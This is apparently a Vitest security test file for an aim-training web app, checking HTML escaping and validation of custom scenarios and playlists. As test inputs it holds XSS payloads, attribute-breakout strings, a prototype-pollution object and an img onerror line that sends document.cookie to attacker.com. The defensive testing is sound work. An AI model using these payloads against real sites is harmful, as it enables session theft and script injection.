import { describe, it, expect } from 'vitest';
import { escapeHtml } from '../src/utils';
import { validateCustomScenarioJSON, createDefaultCustomScenario, convertCustomScenarioToConfig } from '../src/scenarioConfig';
import { validatePlaylist } from '../src/playlist';

describe('Phase 1 — Critical Security Hardening & XSS Prevention', () => {
  describe('escapeHtml utility', () => {
    it('escapes standard HTML injection characters', () => {
      const payload = '<script>alert("XSS")</script>';
      const safe = escapeHtml(payload);
      expect(safe).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(safe).not.toContain('<');
      expect(safe).not.toContain('>');
      expect(safe).not.toContain('"');
    });

    it('escapes single quotes to prevent attribute breakout', () => {
      const payload = "test' onmouseover='alert(1)";
      const safe = escapeHtml(payload);
      expect(safe).toBe('test&#39; onmouseover=&#39;alert(1)');
      expect(safe).not.toContain("'");
    });

    it('escapes ampersands properly', () => {
      expect(escapeHtml('War & Peace')).toBe('War &amp; Peace');
      expect(escapeHtml('&')).toBe('&amp;');
    });

    it('handles empty or nullish inputs safely', () => {
      expect(escapeHtml('')).toBe('');
      expect(escapeHtml(null as unknown as string)).toBe('');
      expect(escapeHtml(undefined as unknown as string)).toBe('');
    });

    it('preserves normal punctuation and Unicode characters', () => {
      const text = 'Aim Training: 360° Micro-flicks (Rank #1) [PRO]!';
      expect(escapeHtml(text)).toBe('Aim Training: 360° Micro-flicks (Rank #1) [PRO]!');
    });

    it('neutralizes complex SVG and event handler payloads', () => {
      const svgPayload = '<svg/onload=alert(String.fromCharCode(88,83,83))>';
      const safeSvg = escapeHtml(svgPayload);
      expect(safeSvg).toBe('&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;');

      const imgPayload = '<img src=x onerror="fetch(`http://attacker.com?c=${document.cookie}`)">';
      const safeImg = escapeHtml(imgPayload);
      expect(safeImg).toBe('&lt;img src=x onerror=&quot;fetch(`http://attacker.com?c=${document.cookie}`)&quot;&gt;');
    });
  });

  describe('Custom Scenario Text Field Validation', () => {
    it('accepts legitimate custom scenario descriptions and names', () => {
      const sc = createDefaultCustomScenario('retaliatory_duel');
      sc.name = 'Valorant Ascent A-Site Retake Drill';
      sc.description = 'Train fast micro-adjustments and counter-strafing against retaliating bots.';
      const res = validateCustomScenarioJSON(sc);
      expect(res.valid).toBe(true);
      expect(res.errors.length).toBe(0);
    });

    it('rejects custom scenario descriptions exceeding maximum length', () => {
      const sc = createDefaultCustomScenario('retaliatory_duel');
      sc.description = 'A'.repeat(501);
      const res = validateCustomScenarioJSON(sc);
      expect(res.valid).toBe(false);
      expect(res.errors).toContain('Scenario description cannot exceed 500 characters');
    });

    it('rejects prototype pollution attempts in scenario JSON', () => {
      const maliciousJson = JSON.parse('{"__proto__": {"isAdmin": true}, "format": "warmuplab-scenario"}');
      const res = validateCustomScenarioJSON(maliciousJson);
      expect(res.valid).toBe(false);
      expect(res.errors).toContain('Disallowed property detected in scenario payload');
    });

    it('rejects custom scenario with malicious or non-allowlisted category', () => {
      const sc = createDefaultCustomScenario('retaliatory_duel');
      sc.category = '<img src=x onerror=alert(1)>' as any;
      const res = validateCustomScenarioJSON(sc);
      expect(res.valid).toBe(false);
      expect(res.errors.some(e => e.includes('Invalid scenario category'))).toBe(true);
    });

    it('rejects custom scenario ID with attribute breakout or disallowed characters', () => {
      const sc = createDefaultCustomScenario('retaliatory_duel');
      sc.id = 'custom_x" onfocus="alert(1)" autofocus="';
      const res = validateCustomScenarioJSON(sc);
      expect(res.valid).toBe(false);
      expect(res.errors.some(e => e.includes('alphanumeric characters, underscores, or hyphens'))).toBe(true);

      sc.id = 'custom_<script>bad</script>';
      const resScript = validateCustomScenarioJSON(sc);
      expect(resScript.valid).toBe(false);
    });

    it('validates playlist IDs against attribute breakout patterns', () => {
      const badPlaylist = {
        id: 'playlist_1" onmouseover="alert(1)',
        name: 'Exploit Playlist',
        entries: [{ id: 'e1', scenarioId: 'flick-static', durationSec: 30 }],
      };
      const res = validatePlaylist(badPlaylist);
      expect(res.valid).toBe(false);
      expect(res.errors.some(e => e.includes('Playlist ID must contain only alphanumeric'))).toBe(true);
    });

    it('DOM rendering neutralizes malicious scenario properties on scenario cards', () => {
      const sc = createDefaultCustomScenario('retaliatory_duel');
      sc.id = 'custom_valid_1';
      sc.name = '<script>alert("name")</script>';
      sc.description = '<img src=x onerror="alert(\'desc\')">';
      sc.category = 'flick';

      const config = convertCustomScenarioToConfig(sc);

      // Render simulated card template equivalent to UI L838-872
      const cardHtml = `
        <div class="card scenario-card" data-scen="${escapeHtml(config.id)}">
          <span class="badge badge-red">${escapeHtml(config.category)}</span>
          <div class="scenario-card-title">${escapeHtml(config.name)}</div>
          <p class="scenario-card-desc">${escapeHtml(config.description)}</p>
          <button class="btn btn-primary btn-sm" data-play-custom="${escapeHtml(config.id)}">PLAY</button>
        </div>
      `;

      const div = document.createElement('div');
      div.innerHTML = cardHtml;

      // Ensure no script elements or onerror attributes exist in DOM
      expect(div.querySelector('script')).toBeNull();
      expect(div.innerHTML).not.toContain('<script>');
      expect(div.innerHTML).not.toContain('<img');
      expect(div.innerHTML).toContain('&lt;script&gt;');
      expect(div.innerHTML).toContain('&lt;img src=x');
    });
  });
});
